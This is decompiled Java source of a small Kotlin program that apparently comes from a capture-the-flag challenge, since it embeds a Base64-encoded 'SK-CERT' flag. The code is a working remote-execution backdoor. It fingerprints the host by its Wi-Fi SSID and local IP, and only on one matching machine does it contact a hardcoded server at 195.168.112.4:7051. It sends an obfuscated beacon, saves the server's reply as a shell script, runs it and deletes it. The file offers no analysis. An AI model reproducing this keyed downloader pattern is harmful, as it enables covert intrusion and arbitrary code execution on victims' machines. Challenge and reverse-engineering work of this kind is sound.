import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.io.Reader;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import java.util.Enumeration;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Base64.Encoder;
import kotlin.Metadata;
import kotlin.collections.ArraysKt;
import kotlin.collections.CollectionsKt;
import kotlin.io.FilesKt;
import kotlin.io.TextStreamsKt;
import kotlin.jvm.internal.Intrinsics;
import kotlin.jvm.internal.SourceDebugExtension;
import kotlin.text.Charsets;
import kotlin.text.MatchResult;
import kotlin.text.Regex;
import kotlin.text.StringsKt;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

@Metadata(
   mv = {2, 1, 0},
   k = 2,
   xi = 48,
   d1 = {"\u0000\u0010\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0005\u001a\u0006\u0010\u0000\u001a\u00020\u0001\u001a\u000e\u0010\u0002\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0003\u001a\b\u0010\u0005\u001a\u0004\u0018\u00010\u0003\u001a\b\u0010\u0006\u001a\u0004\u0018\u00010\u0003\u001a\u000e\u0010\u0007\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0003\u001a\u000e\u0010\b\u001a\u00020\u00032\u0006\u0010\u0004\u001a\u00020\u0003"},
   d2 = {"main", "", "md5", "", "input", "getCurrentSSID", "getLocalIp", "sha256", "base64"}
)
@SourceDebugExtension({"SMAP\ntest.kt\nKotlin\n*S Kotlin\n*F\n+ 1 test.kt\nTestKt\n+ 2 fake.kt\nkotlin/jvm/internal/FakeKt\n*L\n1#1,135:1\n1#2:136\n*E\n"})
public final class TestKt {
   public static final void main() {
      String start_token = "U0stQ0VSVHtqNHJfZDNjMG1wX2s3fQ==";
      byte[] decodedBytes = Base64.getDecoder().decode(start_token);
      Intrinsics.checkNotNull(decodedBytes);
      String decodedString = new String(decodedBytes, Charsets.UTF_8);
      if (((CharSequence)decodedString).length() > 0 && decodedString.charAt(0) == 'S') {
         String serverIp = "195.168.112.4";
         int serverPort = 7051;
         String var10000 = getCurrentSSID();
         if (var10000 == null) {
            var10000 = "unknown_ssid";
         }

         String ssid = var10000;
         var10000 = getLocalIp();
         if (var10000 == null) {
            var10000 = "unknown_ip";
         }

         String ip = var10000;
         String combined = ssid + '|' + ip;
         String hash = md5(combined);
         if (Intrinsics.areEqual((Object)hash, (Object)"de2ca7388ab6efb59a977505b9414ca2")) {
            try {
               Socket socket = new Socket(serverIp, serverPort);
               PrintWriter output = new PrintWriter(socket.getOutputStream(), true);
               BufferedReader input = new BufferedReader((Reader)(new InputStreamReader(socket.getInputStream())));
               byte[] var13 = new byte[]{-67, -33, 90, 3, -3, -61, -71, 35, 109, 78, 37, -109, 113, 90, 65, -109, -99, 66, 90, 66, 65, 83, 66, 79, 53};
               byte[] s = var13;
               int m = 0;

               for(int var14 = var13.length; m < var14; ++m) {
                  int c = s[m] & 255;
                  c ^= m;
                  c = c - 10 & 255;
                  c = -c & 255;
                  c = c + m & 255;
                  c = (c >> 2 | c << 6) & 255;
                  s[m] = (byte)c;
               }

               String encodedData = base64(hash + '|' + new String(s, Charsets.UTF_8));
               output.println(encodedData);
               String response = input.readLine();
               if (response == null) {
                  System.exit(0);
                  throw new RuntimeException("System.exit returned normally, while it was supposed to halt JVM.");
               }

               File tmpFile = File.createTempFile("tempScript", ".sh");

               try {
                  Intrinsics.checkNotNull(tmpFile);
                  FilesKt.writeText$default(tmpFile, response, (Charset)null, 2, (Object)null);
                  tmpFile.setExecutable(true);
                  Process process = Runtime.getRuntime().exec(tmpFile.getAbsolutePath());
                  int var17 = process.waitFor();
               } finally {
                  tmpFile.delete();
               }

               input.close();
               output.close();
               socket.close();
            } catch (IOException var21) {
            }
         }

      } else {
         System.exit(0);
         throw new RuntimeException("System.exit returned normally, while it was supposed to halt JVM.");
      }
   }

   @NotNull
   public static final String md5(@NotNull String input) {
      Intrinsics.checkNotNullParameter(input, "input");
      MessageDigest digest = MessageDigest.getInstance("MD5");
      byte[] var10001 = input.getBytes(Charsets.UTF_8);
      Intrinsics.checkNotNullExpressionValue(var10001, "getBytes(...)");
      byte[] hashBytes = digest.digest(var10001);
      Intrinsics.checkNotNull(hashBytes);
      return ArraysKt.joinToString$default(hashBytes, (CharSequence)"", (CharSequence)null, (CharSequence)null, 0, (CharSequence)null, TestKt::md5$lambda$0, 30, (Object)null);
   }

   @Nullable
   public static final String getCurrentSSID() {
      String var10000 = System.getProperty("os.name");
      Intrinsics.checkNotNullExpressionValue(var10000, "getProperty(...)");
      var10000 = var10000.toLowerCase(Locale.ROOT);
      Intrinsics.checkNotNullExpressionValue(var10000, "toLowerCase(...)");
      String os = var10000;
      String[] var2;
      List var13;
      if (StringsKt.contains$default((CharSequence)os, (CharSequence)"win", false, 2, (Object)null)) {
         var2 = new String[]{"cmd", "/c", "netsh wlan show interfaces"};
         var13 = CollectionsKt.listOf(var2);
      } else {
         if (!StringsKt.contains$default((CharSequence)os, (CharSequence)"nux", false, 2, (Object)null) && !StringsKt.contains$default((CharSequence)os, (CharSequence)"nix", false, 2, (Object)null)) {
            return null;
         }

         var2 = new String[]{"sh", "-c", "iwgetid -r"};
         var13 = CollectionsKt.listOf(var2);
      }

      List command = var13;

      String var9;
      try {
         Process process = (new ProcessBuilder(command)).redirectErrorStream(true).start();
         InputStream var14 = process.getInputStream();
         Intrinsics.checkNotNullExpressionValue(var14, "getInputStream(...)");
         InputStream var4 = var14;
         Charset var5 = Charsets.UTF_8;
         Reader var6 = (Reader)(new InputStreamReader(var4, var5));
         short var7 = 8192;
         String output = TextStreamsKt.readText((Reader)(var6 instanceof BufferedReader ? (BufferedReader)var6 : new BufferedReader(var6, var7)));
         if (StringsKt.contains$default((CharSequence)os, (CharSequence)"win", false, 2, (Object)null)) {
            label45: {
               MatchResult var15 = Regex.find$default(new Regex("SSID\\s*:\\s*(.+)"), (CharSequence)output, 0, 2, (Object)null);
               if (var15 != null) {
                  var13 = var15.getGroupValues();
                  if (var13 != null) {
                     var10000 = (String)var13.get(1);
                     if (var10000 != null) {
                        var10000 = StringsKt.trim((CharSequence)var10000).toString();
                        break label45;
                     }
                  }
               }

               var10000 = null;
            }
         } else {
            String var11 = StringsKt.trim((CharSequence)output).toString();
            int var12 = false;
            var10000 = !StringsKt.isBlank((CharSequence)var11) ? var11 : null;
         }

         var9 = var10000;
      } catch (Exception var8) {
         var9 = null;
      }

      return var9;
   }

   @Nullable
   public static final String getLocalIp() {
      Enumeration interfaces;
      try {
         interfaces = NetworkInterface.getNetworkInterfaces();
         Intrinsics.checkNotNull(interfaces);
         Iterator var1 = CollectionsKt.iterator(interfaces);

         while(var1.hasNext()) {
            NetworkInterface iface = (NetworkInterface)var1.next();
            Enumeration var10000 = iface.getInetAddresses();
            Intrinsics.checkNotNullExpressionValue(var10000, "getInetAddresses(...)");
            Iterator var3 = CollectionsKt.iterator(var10000);

            while(var3.hasNext()) {
               InetAddress addr = (InetAddress)var3.next();
               if (!addr.isLoopbackAddress() && addr instanceof Inet4Address) {
                  return ((Inet4Address)addr).getHostAddress();
               }
            }
         }

         interfaces = null;
      } catch (Exception var5) {
         interfaces = null;
      }

      return interfaces;
   }

   @NotNull
   public static final String sha256(@NotNull String input) {
      Intrinsics.checkNotNullParameter(input, "input");
      MessageDigest digest = MessageDigest.getInstance("SHA-256");
      byte[] var10001 = input.getBytes(Charsets.UTF_8);
      Intrinsics.checkNotNullExpressionValue(var10001, "getBytes(...)");
      byte[] hashBytes = digest.digest(var10001);
      Intrinsics.checkNotNull(hashBytes);
      return ArraysKt.joinToString$default(hashBytes, (CharSequence)"", (CharSequence)null, (CharSequence)null, 0, (CharSequence)null, TestKt::sha256$lambda$2, 30, (Object)null);
   }

   @NotNull
   public static final String base64(@NotNull String input) {
      Intrinsics.checkNotNullParameter(input, "input");
      Encoder var10000 = Base64.getEncoder();
      byte[] var10001 = input.getBytes(Charsets.UTF_8);
      Intrinsics.checkNotNullExpressionValue(var10001, "getBytes(...)");
      String var2 = var10000.encodeToString(var10001);
      Intrinsics.checkNotNullExpressionValue(var2, "encodeToString(...)");
      return var2;
   }

   // $FF: synthetic method
   public static void main(String[] args) {
      main();
   }

   private static final CharSequence md5$lambda$0(byte it) {
      String var1 = "%02x";
      Object[] var2 = new Object[]{it};
      String var10000 = String.format(var1, Arrays.copyOf(var2, var2.length));
      Intrinsics.checkNotNullExpressionValue(var10000, "format(...)");
      return (CharSequence)var10000;
   }

   private static final CharSequence sha256$lambda$2(byte it) {
      String var1 = "%02x";
      Object[] var2 = new Object[]{it};
      String var10000 = String.format(var1, Arrays.copyOf(var2, var2.length));
      Intrinsics.checkNotNullExpressionValue(var10000, "format(...)");
      return (CharSequence)var10000;
   }
}
